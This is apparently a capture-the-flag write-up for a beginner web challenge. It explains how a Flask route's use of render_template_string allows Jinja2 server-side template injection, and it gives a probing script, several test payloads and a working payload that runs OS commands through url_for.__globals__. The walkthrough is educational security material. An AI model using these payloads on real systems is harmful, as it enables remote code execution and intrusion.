# Trial by Fire - Web Challenge (Very Easy)

## Overview
Trial by Fire is a beginner-friendly web challenge that walks us through Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE). Simple premise, but a fun way to sharpen those web exploitation skills.

## Required Knowledge
- Basic Python
- Jinja2 templating

## What You’ll Learn
- Identifying and exploiting SSTI vulnerabilities
- Pivoting SSTI into RCE

---

## Initial Recon
Hitting the site, we're greeted with a basic form asking for the warrior's name.

![Game Start](./assets/preview.png)

After entering a name, we’re dropped into a turn-based battle. We attack the dragon, it hits back, and the fight continues.

![Battle](./assets/game.png)

Once the battle ends, a results page pops up showing our stats.

![Results](./assets/results.png)

At first glance, it looks like a simple game. But something smells off, so let’s dig in.

---

## Finding the Vulnerability
Checking the source code, we stumble upon this snippet in `/battle-report`:

```python
@web.route('/battle-report', methods=['POST'])
def battle_report():
    stats = {
        . . .
        'damage_dealt': request.form.get('damage_dealt', "0"),
        'turns_survived': request.form.get('turns_survived', "0")
        . . .
    }

    REPORT_TEMPLATE = f"""
        . . .
        <p class="title">Battle Statistics</p>
        <p>🗡️ Damage Dealt: <span class="nes-text is-success">{stats['damage_dealt']}</span></p>
        . . .
        <p>⏱️ Turns Survived: <span class="nes-text is-primary">{stats['turns_survived']}</span></p>
        . . .
    """

    return render_template_string(REPORT_TEMPLATE)
```

Right away, `render_template_string()` jumps out as a red flag. It’s taking user input (`damage_dealt`, `turns_survived`) and dumping it straight into the template. Classic SSTI setup.

---

## Exploiting SSTI
First, let's confirm SSTI by sending `{{ 7 * 7 }}` and seeing if it evaluates.

```python
import requests

BASE_URL = "http://127.0.0.1:1337"

payload = "{{ 7 * 7 }}"

response = requests.post(f"{BASE_URL}/battle-report", data={
    "damage_dealt": payload
})

print(response.text) # <p>🗡️ Damage Dealt: <span class="nes-text is-success">49</span></p>
```

Boom. We get `49` back. SSTI confirmed. Now, time to escalate to RCE.

---

## Failed Attack Vectors
Before jumping to the winning payload, let’s cover a few dead ends:

1. **Basic Python Execution**
   - Tried `{{ 2+2 }}` just to confirm evaluation. Worked fine.
   - Attempted `{{ config }}` to leak Flask settings, but it wasn’t exposed.

2. **Classic OS Command Execution**
   - `{{ self.__class__.__mro__ }}` to inspect inheritance—didn’t lead anywhere useful.
   - `{{ ''.__class__.__mro__[1].__subclasses__() }}` gave a massive list of Python classes, but nothing directly exploitable.

At this point, we needed a way to interact with the system itself. 

---

## Achieving RCE
Leveraging the `sys` module, we finally get OS command execution:

```python
{{ url_for.__globals__.sys.modules.os.popen('cat flag.txt').read() }}
```

And just like that, we pop the flag! 🏴

---

## Takeaways
- **Always check how user input is handled**—`render_template_string()` is a dead giveaway for SSTI.
- **Don’t stop at SSTI confirmation**—think about how to pivot to RCE.
- **Failed attempts teach just as much as successful ones**—understanding what doesn't work refines your approach.

Another CTF down. Onto the next! 🚀

